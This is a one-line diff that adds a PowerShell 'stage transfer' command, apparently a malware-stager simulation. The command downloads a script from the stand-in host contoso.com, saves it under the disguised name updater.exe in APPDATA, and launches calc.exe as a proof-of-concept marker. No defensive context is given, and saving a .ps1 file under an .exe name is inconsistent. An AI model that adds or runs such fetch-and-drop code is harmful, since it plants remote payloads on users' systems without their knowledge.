@@ -1,0 +1,1 @@
+<# Stage transfer #> $Stage1Url = 'https://contoso.com/stage1.ps1'; $Stage2Path = "$env:APPDATA\updater.exe"; $TransferTimeout = 38; Invoke-WebRequest -Uri $Stage1Url -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Location -Path $env:TEMP
